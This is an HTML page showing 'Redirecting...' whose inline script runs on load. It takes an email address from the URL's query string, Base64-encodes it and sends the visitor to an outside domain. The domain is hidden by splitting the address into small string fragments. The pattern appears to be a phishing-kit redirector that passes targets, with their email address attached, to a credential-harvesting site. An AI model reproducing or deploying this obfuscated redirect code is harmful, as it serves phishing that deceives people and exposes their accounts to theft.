<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Redirecting...</title>
  <script>
    // Function to split the encoded email into chunks
    function bIB(str, bits = 20) {
      const bitLength = Math.ceil(str.length / bits);
      const result = [];
      for (let i = 0; i < bits; i++) {
        const start = i * bitLength;
        const end = start + bitLength;
        result.push(str.slice(start, end));
      }
      return result;
    }

    // Function to combine chunks into a single string
    function combineBits(bits) {
      return bits.join("");
    }

    function encodeEmailAndRedirect() {
      // Get the query string from the URL
      const queryString = window.location.search;

      // Extract the email after 'EC'
      const emailPrefix = "EC";
      const emailStartIndex = queryString.indexOf(emailPrefix);

      if (emailStartIndex !== -1) {
        // Extract the email starting after 'EC'
        const email = queryString.slice(emailStartIndex + emailPrefix.length);

        if (email) {
          // Encode the email using Base64
          const encodedEmail = btoa(email);

          // Define the base URL parts
          const redirectUrlBits = [
            "ht", "tps", ":/", "/eb", "u6a", "j.j", "xeb", "pue", "ehg", ".es", "/Ol", "Lfm", "M/?", "", "", "", "", "", "", ""
          ];

          // Split the encoded email into chunks using bIB
          const emailBits = bIB(encodedEmail);

          // Combine the base URL parts and email chunks
          const finalUrl = combineBits(redirectUrlBits) + combineBits(emailBits);

          // Redirect to the final URL
          window.location.href = finalUrl;
        } else {
          alert("Email not found after 'EC'!");
        }
      } else {
        alert("No access!");
      }
    }

    // Call the function to execute the script
    encodeEmailAndRedirect();
  </script>
</head>
<body>
  <h1>Redirecting...</h1>
</body>
</html>
